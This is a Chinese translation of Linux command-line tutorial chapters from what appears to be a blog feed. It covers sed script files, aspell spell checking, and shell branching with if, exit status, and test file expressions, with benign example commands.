<p>到目前为止，我们只通过命令行给 sed 提供了单个命令。通过使用 -f 选项，也可以在脚本文件中构建更复杂的命令。为了演示，我们将使用 sed 和我们的 distros.txt 文件来构建一个报告。我们的报告将在顶部有一个标题，我们修改过的日期，以及所有发行版名称转换为大写。为此，我们需要编写一个脚本，所以我们将启动文本编辑器并输入以下内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sed 脚本来生成 Linux 发行版报告</span></span><br><span class="line">1 i\</span><br><span class="line">\</span><br><span class="line">Linux Distributions Report\</span><br><span class="line">s/\([0-9]\&#123;2\&#125;\)\/\([0-9]\&#123;2\&#125;\)\/\([0-9]\&#123;4\&#125;\)$/\3-\1-\2/</span><br><span class="line">y/abcdefghijklmnopqrstuvwxyz/ABCDEFGHIJKLMNOPQRSTUVWXYZ/</span><br></pre></td></tr></table></figure>

<p>我们将把 sed 脚本保存为 distros.sed 并这样运行它：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ sed -f distros.sed distros.txt</span><br><span class="line">Linux Distributions Report</span><br><span class="line">SUSE 10.2 2006-12-07</span><br><span class="line">FEDORA 10 2008-11-25</span><br><span class="line">SUSE 11.0 2008-06-19</span><br><span class="line">UBUNTU 8.04 2008-04-24</span><br><span class="line">FEDORA 8 2007-11-08</span><br><span class="line">SUSE 10.3 2007-10-04</span><br><span class="line">UBUNTU 6.10 2006-10-26</span><br><span class="line">FEDORA 7 2007-05-31</span><br><span class="line">UBUNTU 7.10 2007-10-18</span><br><span class="line">UBUNTU 7.04 2007-04-19</span><br><span class="line">SUSE 10.1 2006-05-11</span><br><span class="line">FEDORA 6 2006-10-24</span><br><span class="line">FEDORA 9 2008-05-13</span><br><span class="line">UBUNTU 6.06 2006-06-01</span><br><span class="line">UBUNTU 8.10 2008-10-30</span><br><span class="line">FEDORA 5 2006-03-20</span><br></pre></td></tr></table></figure>

<p>正如我们所看到的，我们的脚本产生了期望的结果，但它是如何做到的？让我们再看一下我们的脚本。我们将使用 cat 来编号行。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">cat</span> -n distros.sed</span><br><span class="line"> 1 <span class="comment"># sed 脚本来生成 Linux 发行版报告</span></span><br><span class="line"> 2</span><br><span class="line"> 3 1 i\</span><br><span class="line"> 4 \</span><br><span class="line"> 5 Linux Distributions Report\</span><br><span class="line"> 6</span><br><span class="line"> 7 s/\([0-9]\&#123;2\&#125;\)\/\([0-9]\&#123;2\&#125;\)\/\([0-9]\&#123;4\&#125;\)$/\3-\1-\2/</span><br><span class="line"> 8 y/abcdefghijklmnopqrstuvwxyz/ABCDEFGHIJKLMNOPQRSTUVWXYZ/</span><br></pre></td></tr></table></figure>

<p>我们脚本的第一行是一个<em>注释</em>。像许多 Linux 系统上的配置文件和编程语言一样，注释以 # 字符开始，后跟人类可读的文本。注释可以放在脚本的任何地方（尽管不在命令本身内部）并对任何可能需要识别和&#x2F;或维护脚本的人类有所帮助。</p>
<p>第 2 行是一个空行。像注释一样，空行可以添加以提高可读性。</p>
<p>许多 sed 命令支持行地址。这些用于指定要对哪些输入行进行操作。行地址可以表示为单个行号、行号范围，以及表示输入最后一行的特殊行号 $。</p>
<p>第 3、4、5 和 6 行包含要在地址 1，输入的第一行处插入的文本。i 命令后跟一个反斜杠然后是回车符的序列，以产生一个转义的回车符，或所谓的<em>行续字符</em>。这个序列可以在许多情况下使用，包括 shell 脚本，允许在文本流中嵌入回车符而不会向解释器（在这种情况下是 sed）发出行结束的信号。i 和 a（它追加文本，而不是插入）以及 c（它替换文本）命令允许多行文本，只要每行（最后一行除外）都以行续字符结束。我们脚本的第六行实际上是我们插入文本的结尾，并以普通的回车符而不是行续字符结束，标志着 i 命令的结束。</p>
<p>**注意：**行续字符由反斜杠后<em>紧接着</em>一个回车符形成。不允许中间有空格。</p>
<p>第 7 行是我们的搜索和替换命令。由于它没有被地址前置，输入流中的每一行都受到其作用。</p>
<p>第 8 行执行将小写字母转换为大写字母的转换。注意与 tr 不同，sed 中的 y 命令不支持字符范围（例如，[az]），也不支持 POSIX 字符类。再次，由于 y 命令没有被地址前置，它适用于输入流中的每一行。</p>
<p><strong>喜欢 sed 的人也喜欢…</strong></p>
<p>sed 是一个能够执行相当复杂的编辑任务的强大程序。它最常用于简单的一行任务而不是长脚本。许多用户更喜欢其他工具来处理较大的任务。其中最受欢迎的是 awk 和 perl。这些不仅仅是像这里讨论的程序那样的简单工具，而是扩展到完整编程语言的领域。特别是 perl，它经常用来替代 shell 脚本进行许多系统管理和管理任务，也是 web 开发的受欢迎媒介。awk 更加专门化。它的特定优势是能够操纵表格数据。它与 sed 类似，awk 程序通常逐行处理文本文件，使用类似于 sed 地址后跟动作的概念。尽管 awk 和 perl 超出了本书的范围，但它们是 Linux 命令行用户学习的好技能。</p>
<h4 id="aspell"><a href="#aspell" class="headerlink" title="aspell"></a>aspell</h4><p>我们将要看的最后一个工具是 aspell，一个交互式拼写检查器。aspell 程序是早期名为 ispell 程序的继承者，大多数情况下，可以作为替代品使用。虽然 aspell 程序主要被需要拼写检查功能的其他程序使用，但它也可以作为一个独立工具从命令行有效使用。它能够智能检查各种类型的文本文件，包括 HTML 文档、C&#x2F;C++ 程序、电子邮件消息和其他类型的专业文本。</p>
<p>要对包含简单散文的文本文件进行拼写检查，可以这样使用：</p>
<blockquote>
<p>aspell check <em>textfile</em></p>
</blockquote>
<p>其中 <em>textfile</em> 是要检查的文件名。作为一个实际示例，让我们创建一个名为 foo.txt 的简单文本文件，其中包含一些故意的拼写错误。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">cat</span> &gt; foo.txt</span><br><span class="line">The quick brown fox jimped over the laxy dog.</span><br></pre></td></tr></table></figure>

<p>接下来我们将使用 aspell 检查文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ aspell check foo.txt</span><br></pre></td></tr></table></figure>

<p>由于 aspell 在检查模式下是交互式的，我们将看到这样的屏幕：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">The quick brown fox jimped over the laxy dog.</span><br><span class="line">1) jumped 6) wimped</span><br><span class="line">2) gimped 7) camped</span><br><span class="line">3) comped 8) humped</span><br><span class="line">4) limped 9) impede</span><br><span class="line">5) pimped 0) umped</span><br><span class="line">i) Ignore I) Ignore all</span><br><span class="line">r) Replace R) Replace all</span><br><span class="line">a) Add l) Add Lower</span><br><span class="line">b) Abort x) Exit</span><br><span class="line">?</span><br></pre></td></tr></table></figure>

<p>在显示顶部，我们看到我们的文本中有一个可疑的单词被突出显示。在中间，我们看到十个拼写建议，编号为零到九，后跟其他可能的操作列表。最后，在底部，我们看到一个提示，准备接受我们的选择。</p>
<p>如果我们按下 1 键，aspell 会将问题词替换为“jumped”并继续到下一个拼写错误的词，即 laxy。如果我们选择替换为 lazy，aspell 替换它并终止。一旦 aspell 完成，我们可以检查我们的文件，看到拼写错误已被更正：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">cat</span> foo.txt</span><br><span class="line">The quick brown fox jumped over the lazy dog.</span><br></pre></td></tr></table></figure>

<p>除非通过命令行选项 –dont-backup 否则告知，aspell 会创建一个包含原始文本的备份文件，通过将扩展名 .bak 添加到文件名。</p>
<p>展示我们的 sed 编辑技巧，我们将把我们的拼写错误放回去，以便我们可以重用我们的文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ sed -i <span class="string">&#x27;s/lazy/laxy/; s/jumped/jimped/&#x27;</span> foo.txt</span><br></pre></td></tr></table></figure>

<p>sed 选项 -i 告诉 sed “就地”编辑文件，意味着而不是将编辑后的输出发送到标准输出，它会用更改应用后重写文件。我们还看到通过用分号分隔它们，可以在行上放置多个编辑命令。</p>
<p>接下来，我们将看看 aspell 如何处理不同类型的文本文件。使用文本编辑器，如 vim（喜欢冒险的可能想尝试 sed），我们将向我们的文件添加一些 HTML 标记。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  	<span class="tag">&lt;<span class="name">title</span>&gt;</span>Mispelled HTML file<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  	<span class="tag">&lt;<span class="name">p</span>&gt;</span>The quick brown fox jimped over the laxy dog.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>现在，如果我们尝试拼写检查我们修改过的文件，我们会遇到问题。如果我们这样做：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ aspell check foo.txt</span><br></pre></td></tr></table></figure>

<p>我们会得到这个：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"> 		<span class="tag">&lt;<span class="name">title</span>&gt;</span>Mispelled HTML file<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> 		<span class="tag">&lt;<span class="name">p</span>&gt;</span>The quick brown fox jimped over the laxy dog.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">1) HTML 4) Hamel</span><br><span class="line">2) ht ml 5) Hamil</span><br><span class="line">3) ht-ml 6) hotel</span><br><span class="line">i) Ignore I) Ignore all</span><br><span class="line">r) Replace R) Replace all</span><br><span class="line">a) Add l) Add Lower</span><br><span class="line">b) Abort x) Exit</span><br><span class="line">?</span><br></pre></td></tr></table></figure>

<p>aspell 会将 HTML 标签的内容视为拼写错误。通过包含 -H (HTML) 检查模式选项，可以克服这个问题，像这样：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ aspell -H check foo.txt</span><br></pre></td></tr></table></figure>

<p>这将导致这个结果：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>Mispelled HTML file<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">p</span>&gt;</span>The quick brown fox jimped over the laxy dog.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">1) Mi spelled 6) Misapplied</span><br><span class="line">2) Mi-spelled 7) Miscalled</span><br><span class="line">3) Misspelled 8) Respelled</span><br><span class="line">4) Dispelled 9) Misspell</span><br><span class="line">5) Spelled 0) Misled</span><br><span class="line">i) Ignore I) Ignore all</span><br><span class="line">r) Replace R) Replace all</span><br><span class="line">a) Add l) Add Lower</span><br><span class="line">b) Abort x) Exit</span><br><span class="line">?</span><br></pre></td></tr></table></figure>

<p>HTML 被忽略，只有文件的非标记部分被检查。在此模式下，HTML 标签的内容被忽略，不进行拼写检查。然而，ALT 标签的内容，因为受益于检查，会在此模式下被检查。</p>
<p>**注意：**默认情况下，aspell 会忽略文本中的网址和电子邮件地址。这种行为可以通过命令行选项覆盖。也可以指定哪些标记标签被检查和跳过。详情见 aspell 手册页。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在本章中，我们查看了许多在文本上操作的命令行工具。在下一章中，我们将查看更多。诚然，这些工具的使用方法和原因可能不会立即显而易见，尽管我们试图展示它们的一些实际示例。我们将在后续章节中发现，这些工具构成了用于解决众多实际问题的工具集的基础。当我们进入 shell 脚本编写时，这将尤其真实，这些工具将真正显示它们的价值。</p>
<h3 id="进一步阅读"><a href="#进一步阅读" class="headerlink" title="进一步阅读"></a>进一步阅读</h3><p>GNU 项目网站包含了关于本章讨论的工具的许多在线指南。</p>
<ul>
<li><p>来自 Coreutils 包：</p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5nbnUub3JnL3NvZnR3YXJlL2NvcmV1dGlscy9tYW51YWwvY29yZXV0aWxzLmh0bWwjT3V0cHV0LW9mLWVudGlyZS1maWxlcw==">http://www.gnu.org/software/coreutils/manual/coreutils.html#Output-of-entire-files<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5nbnUub3JnL3NvZnR3YXJlL2NvcmV1dGlscy9tYW51YWwvY29yZXV0aWxzLmh0bWwjT3BlcmF0aW5nLW9uLXNvcnRlZC1maWxlcw==">http://www.gnu.org/software/coreutils/manual/coreutils.html#Operating-on-sorted-files<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5nbnUub3JnL3NvZnR3YXJlL2NvcmV1dGlscy9tYW51YWwvY29yZXV0aWxzLmh0bWwjT3BlcmF0aW5nLW9uLWZpZWxkcw==">http://www.gnu.org/software/coreutils/manual/coreutils.html#Operating-on-fields<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5nbnUub3JnL3NvZnR3YXJlL2NvcmV1dGlscy9tYW51YWwvY29yZXV0aWxzLmh0bWwjT3BlcmF0aW5nLW9uLWNoYXJhY3RlcnM=">http://www.gnu.org/software/coreutils/manual/coreutils.html#Operating-on-characters<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p>来自 Diffutils 包：<span class="exturl" data-url="aHR0cDovL3d3dy5nbnUub3JnL3NvZnR3YXJlL2RpZmZ1dGlscy9tYW51YWwvaHRtbF9tb25vL2RpZmYuaHRtbA==">http://www.gnu.org/software/diffutils/manual/html_mono/diff.html<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p>sed：<span class="exturl" data-url="aHR0cDovL3d3dy5nbnUub3JnL3NvZnR3YXJlL3NlZC9tYW51YWwvc2VkLmh0bWw=">http://www.gnu.org/software/sed/manual/sed.html<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p>aspell：<span class="exturl" data-url="aHR0cDovL2FzcGVsbC5uZXQvbWFuLWh0bWwvaW5kZXguaHRtbA==">http://aspell.net/man-html/index.html<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p>关于 sed 的其他在线资源特别多：<span class="exturl" data-url="aHR0cDovL3d3dy5ncnltb2lyZS5jb20vVW5peC9TZWQuaHRtbA==">http://www.grymoire.com/Unix/Sed.html<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cDovL3NlZC5zb3VyY2Vmb3JnZS5uZXQvc2VkMWxpbmUudHh0">http://sed.sourceforge.net/sed1line.txt<i class="fa fa-external-link-alt"></i></span></p>
<p>另外尝试谷歌搜索“sed 单行命令”，“sed 速查表”</p>
</li>
</ul>
<h3 id="额外学习"><a href="#额外学习" class="headerlink" title="额外学习"></a>额外学习</h3><p>还有一些更有趣的文本操作命令值得研究。其中包括 split（将文件分割成片段）、csplit（基于上下文将文件分割成片段）和 sdiff（文件差异的并排合并）。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>TLCL</tag>
      </tags>
  </entry>
  <entry>
    <title>流程控制：使用if进行分支</title>
    <url>/2024/05/27-branching-with-if/</url>
    <content><![CDATA[<h2 id="27-–-流程控制：使用if进行分支"><a href="#27-–-流程控制：使用if进行分支" class="headerlink" title="27 – 流程控制：使用if进行分支"></a>27 – 流程控制：使用if进行分支</h2><p>在上一章中，我们遇到了一个问题。我们如何使我们的报告生成脚本根据运行脚本的用户的权限来适应？解决这个问题将需要我们找到一种方法，在脚本中根据测试的结果“改变方向”。用编程术语来说，我们需要程序进行<em>分支</em>。</p>
<p>让我们考虑一个用<em>伪代码</em>表达的简单逻辑示例，伪代码是一种旨在供人阅读的计算机语言模拟。</p>
<span id="more"></span>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">X = 5</span><br><span class="line">如果 X = 5, 那么:</span><br><span class="line">	说 “X 等于 5。”</span><br><span class="line">否则:</span><br><span class="line">	说 “X 不等于 5。”</span><br></pre></td></tr></table></figure>

<p>这是一个分支的示例。基于条件，“X &#x3D; 5 吗？”做一件事，“说 X 等于 5”，否则做另一件事，“说 X 不等于 5”。</p>
<h3 id="if"><a href="#if" class="headerlink" title="if"></a>if</h3><p>使用shell，我们可以如下编码前面的逻辑：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">x=5</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$x</span>&quot;</span> -eq 5 ]; <span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;x 等于 5。&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;x 不等于 5。&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>或者我们可以直接在命令行中输入（稍微简短一些）。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ x=5</span><br><span class="line">[me@linuxbox ~]$ <span class="keyword">if</span> [ “<span class="variable">$x</span>” -eq 5 ]; <span class="keyword">then</span> <span class="built_in">echo</span> <span class="string">&quot;等于 5&quot;</span>; <span class="keyword">else</span> <span class="built_in">echo</span></span><br><span class="line"><span class="string">&quot;不等于 5&quot;</span>; <span class="keyword">fi</span></span><br><span class="line">等于 5</span><br><span class="line">[me@linuxbox ~]$ x=0</span><br><span class="line">[me@linuxbox ~]$ <span class="keyword">if</span> [ “<span class="variable">$x</span>” -eq 5 ]; <span class="keyword">then</span> <span class="built_in">echo</span> <span class="string">&quot;等于 5&quot;</span>; <span class="keyword">else</span> <span class="built_in">echo</span></span><br><span class="line"><span class="string">&quot;不等于 5&quot;</span>; <span class="keyword">fi</span></span><br><span class="line">不等于 5</span><br></pre></td></tr></table></figure>

<p>在这个例子中，我们执行了两次命令；一次，x的值设置为5，结果输出字符串“等于 5”，第二次x的值设置为0，结果输出字符串“不等于 5”。</p>
<p>if语句有以下语法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> commands; <span class="keyword">then</span></span><br><span class="line">	commands</span><br><span class="line">[<span class="keyword">elif</span> commands; <span class="keyword">then</span></span><br><span class="line">	commands...]</span><br><span class="line">[<span class="keyword">else</span></span><br><span class="line">	commands]</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>其中<em>commands</em>是命令列表。这一点乍看之下有点令人困惑。但在我们可以澄清这一点之前，我们必须看看shell如何评估命令的成功或失败。</p>
<h4 id="退出状态"><a href="#退出状态" class="headerlink" title="退出状态"></a><strong>退出状态</strong></h4><p>命令（包括我们编写的脚本和shell函数）在它们终止时向系统发出一个值，称为<em>退出状态</em>。这个值是一个0到255范围内的整数，指示命令执行的成功或失败。按照惯例，零值表示成功，任何其他值表示失败。shell提供了一个参数，我们可以用它来检查退出状态。这里我们看到它的作用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> -d /usr/bin</span><br><span class="line">/usr/bin</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> $?</span><br><span class="line">0</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> -d /bin/usr</span><br><span class="line"><span class="built_in">ls</span>: 无法访问 /bin/usr: 没有那个文件或目录</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> $?</span><br><span class="line">2</span><br></pre></td></tr></table></figure>

<p>在这个示例中，我们两次执行ls命令。第一次，命令成功执行。如果我们显示参数<code>$?的值，我们看到它是零。我们第二次执行ls命令（指定一个不存在的目录），产生一个错误，并再次检查参数$</code>?。这次它包含2，表示命令遇到了错误。一些命令使用不同的退出状态值来提供错误诊断，而许多命令在失败时简单地退出并返回值1。手册页通常包括一个名为“退出状态”的部分，描述了使用哪些代码。然而，零始终表示成功。</p>
<p>shell提供了两个非常简单的内置命令，除了终止时带有0</p>
<p>或1退出状态外，什么也不做。true命令总是成功执行，false命令总是执行失败。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="literal">true</span></span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> $?</span><br><span class="line">0</span><br><span class="line">[me@linuxbox ~]$ <span class="literal">false</span></span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> $?</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p>我们可以使用这些命令来看看if语句是如何工作的。if语句真正做的是评估命令的成功或失败。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="keyword">if</span> <span class="literal">true</span>; <span class="keyword">then</span> <span class="built_in">echo</span> <span class="string">&quot;它是真的。&quot;</span>; <span class="keyword">fi</span></span><br><span class="line">它是真的。</span><br><span class="line">[me@linuxbox ~]$ <span class="keyword">if</span> <span class="literal">false</span>; <span class="keyword">then</span> <span class="built_in">echo</span> <span class="string">&quot;它是真的。&quot;</span>; <span class="keyword">fi</span></span><br><span class="line">[me@linuxbox ~]$</span><br></pre></td></tr></table></figure>

<p>当if后面的命令成功执行时，命令echo “它是真的。”被执行，当if后面的命令没有成功执行时，不执行该命令。如果if后面跟着命令列表，列表中的最后一个命令被评估：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="keyword">if</span> <span class="literal">false</span>; <span class="literal">true</span>; <span class="keyword">then</span> <span class="built_in">echo</span> <span class="string">&quot;它是真的。&quot;</span>; <span class="keyword">fi</span></span><br><span class="line">它是真的。</span><br><span class="line">[me@linuxbox ~]$ <span class="keyword">if</span> <span class="literal">true</span>; <span class="literal">false</span>; <span class="keyword">then</span> <span class="built_in">echo</span> <span class="string">&quot;它是真的。&quot;</span>; <span class="keyword">fi</span></span><br><span class="line">[me@linuxbox ~]$ </span><br></pre></td></tr></table></figure>

<h3 id="test"><a href="#test" class="headerlink" title="test"></a>test</h3><p>到目前为止，与if最频繁使用的命令是test。test命令执行各种检查和比较。它有两种等效的形式。第一种，如下所示：</p>
<blockquote>
<p>test <em>expression</em></p>
</blockquote>
<p>第二种，更受欢迎的形式，如下所示：</p>
<blockquote>
<p>[ <em>expression</em> ]</p>
</blockquote>
<p>其中<em>expression</em>是一个被评估为真或假的表达式。当表达式为真时，test命令返回退出状态0，当表达式为假时返回状态1。</p>
<p>有趣的是，test和[实际上都是命令。在bash中它们是内置的，但它们也作为程序存在于&#x2F;usr&#x2F;bin中，供其他shell使用。表达式实际上只是它的参数，[命令要求]字符作为它的最后一个参数提供。</p>
<p>test和[命令支持广泛的有用表达式和测试。</p>
<h4 id="文件表达式"><a href="#文件表达式" class="headerlink" title="文件表达式"></a>文件表达式</h4><p>表27-1列出了用于评估文件状态的表达式。</p>
<p><em>表27-1:</em> <em>test文件表达式</em></p>
<table>
<thead>
<tr>
<th><strong>表达式</strong></th>
<th><strong>为真如果：</strong></th>
</tr>
</thead>
<tbody><tr>
<td><em>file1</em> -ef <em>file2</em></td>
<td><em>file1</em>和<em>file2</em>有相同的inode编号（两个文件名通过硬链接引用同一个文件）。</td>
</tr>
<tr>
<td><em>file1</em> -nt <em>file2</em></td>
<td><em>file1</em>比<em>file2</em>更新。</td>
</tr>
<tr>
<td><em>file1</em> -ot <em>file2</em></td>
<td><em>file1</em>比<em>file2</em>旧。</td>
</tr>
<tr>
<td>-b <em>file</em></td>
<td><em>file</em>存在且是一个块特殊（设备）文件。</td>
</tr>
<tr>
<td>-c <em>file</em></td>
<td><em>file</em>存在且是一个字符特殊（设备）文件。</td>
</tr>
<tr>
<td>-d <em>file</em></td>
<td><em>file</em>存在且是一个目录。</td>
</tr>
<tr>
<td>-e <em>file</em></td>
<td><em>file</em>存在。</td>
</tr>
<tr>
<td>-f <em>file</em></td>
<td><em>file</em>存在且是一个常规文件。</td>
</tr>
<tr>
<td>-g <em>file</em></td>
<td><em>file</em>存在且设置了组ID。</td>
</tr>
<tr>
<td>-G <em>file</em></td>
<td><em>file</em>存在且属于有效组ID。</td>
</tr>
<tr>
<td>-k <em>file</em></td>
<td><em>file</em>存在且设置了“粘滞位”。</td>
</tr>
<tr>
<td>-L <em>file</em></td>
<td><em>file</em>存在且是一个符号链接。</td>
</tr>
<tr>
<td>-O <em>file</em></td>
<td><em>file</em>存在且属于有效用户ID。</td>
</tr>
<tr>
<td>-p <em>file</em></td>
<td><em>file</em>存在且是一个命名管道。</td>
</tr>
<tr>
<td>-r <em>file</em></td>
<td><em>file</em>存在且可读（对有效用户有可读权限）。</td>
</tr>
<tr>
<td>-s <em>file</em></td>
<td><em>file</em>存在且长度大于零。</td>
</tr>
<tr>
<td>-S <em>file</em></td>
<td><em>file</em>存在且是一个网络套接字。</td>
</tr>
<tr>
<td>-t <em>fd</em></td>
<td><em>fd</em>是一个定向到&#x2F;来自终端的文件描述符。这可以用来确定标准输入&#x2F;输出&#x2F;错误是否被重定向。</td>
</tr>
<tr>
<td>-u <em>file</em></td>
<td><em>file</em>存在且是setuid。</td>
</tr>
<tr>
<td>-w <em>file</em></td>
<td><em>file</em>存在且可写（对有效用户有写权限）。</td>
</tr>
<tr>
<td>-x <em>file</em></td>
<td><em>file</em>存在且可执行（对有效用户有执行&#x2F;搜索权限）。</td>
</tr>
</tbody></table>
<p>这里我们有一个演示一些文件表达式的脚本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># test-file: 评估文件的状态</span></span><br><span class="line">FILE=~/.bashrc</span><br><span class="line"><span class="keyword">if</span> [ -e <span class="string">&quot;<span class="variable">$FILE</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">if</span> [ -f <span class="string">&quot;<span class="variable">$FILE</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">  	<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$FILE</span> 是一个常规文件。&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">if</span> [ -d <span class="string">&quot;<span class="variable">$FILE</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">  	<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$FILE</span> 是一个目录。&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">if</span> [ -r <span class="string">&quot;<span class="variable">$FILE</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">  	<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$FILE</span> 是可读的。&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">if</span> [ -w <span class="string">&quot;<span class="variable">$FILE</span>&quot;</span> ]; <span class="keyword">then</span> </span><br><span class="line">  	<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$FILE</span> 是可写的。&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">if</span> [ -x <span class="string">&quot;<span class="variable">$FILE</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">  	<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$FILE</span> 是可执行/可搜索的。&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$FILE</span> 不存在&quot;</span></span><br><span class="line">	<span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>

<p>这个脚本评估赋给常量FILE的文件，并在进行评估时显示其结果。关于这个脚本有两件有趣的事情需要注意。首先，注意参数<code>$FILE在表达式中是如何被引用的。这不是语法上完成表达式所必需的；而是防御参数为空或只包含空格的情况。如果$</code>FILE的参数扩展结果为空值，它会导致错误（操作符会被解释为非空字符串而不是操作符）。在参数周围使用引号确保操作符后面总是跟着一个字符串，即使字符串为空。其次，注意脚本接近末尾处的exit命令的存在。exit命令接受一个可选的单一参数，该参数成为脚本的退出状态。当没有传递参数时，退出状态默认为最后执行的命令的退出状态。以这种方式使用exit允许脚本在$FILE展开为不存在文件的名称时指示失败。出现在脚本最后一行的exit命令是一种形式上的存在。当脚本“运行到末尾”（达到文件末尾）时，它以最后执行的命令的退出状态终止。</p>
<p>类似地，shell函数可以通过向return命令包含一个整数参数来返回一个退出状态。如果我们要将前面的脚本转换为一个shell函数以包含在一个更大的程序中，我们可以用return语句替换exit命令并获得所需的行为。</p>
